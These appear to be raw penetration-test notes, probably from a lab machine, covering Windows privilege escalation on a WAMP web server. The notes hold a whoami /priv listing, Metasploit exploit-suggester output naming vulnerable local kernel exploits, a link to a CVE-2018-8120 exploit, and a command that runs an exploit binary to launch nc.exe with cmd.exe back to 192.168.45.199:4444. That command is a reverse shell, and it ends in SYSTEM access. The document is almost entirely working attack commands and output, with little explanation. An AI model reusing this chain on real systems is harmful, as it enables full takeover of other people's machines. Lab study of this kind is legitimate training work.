C:\\wamp\\www\>whoami /priv 
whoami /priv

PRIVILEGES INFORMATION
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

msfconsole \> exploit suggester
\[\*\] 192\.168\.190\.46 \- Collecting local exploits for x86/windows\.\.\.
\[\*\] 192\.168\.190\.46 \- 193 exploit checks are being tried\.\.\.
\[\+\] 192\.168\.190\.46 \- exploit/windows/local/cve\_2020\_0787\_bits\_arbitrary\_file\_move: The service is running, but could not be validated\. Windows Windows Server 2008 build detected\!
\[\+\] 192\.168\.190\.46 \- exploit/windows/local/ms10\_015\_kitrap0d: The service is running, but could not be validated\.
\[\+\] 192\.168\.190\.46 \- exploit/windows/local/ms15\_051\_client\_copy\_image: The target appears to be vulnerable\.
\[\+\] 192\.168\.190\.46 \- exploit/windows/local/ms16\_016\_webdav: The service is running, but could not be validated\.
\[\+\] 192\.168\.190\.46 \- exploit/windows/local/ms16\_075\_reflection: The target appears to be vulnerable\.
\[\+\] 192\.168\.190\.46 \- exploit/windows/local/ppr\_flatten\_rec: The target appears to be vulnerable\.

[https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120](#https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120)


-  x86\.exe "nc\.exe \-nv 192\.168\.45\.199 4444 \-e cmd\.exe"

C:\\Tools\>whoami
whoami
nt authority\\system


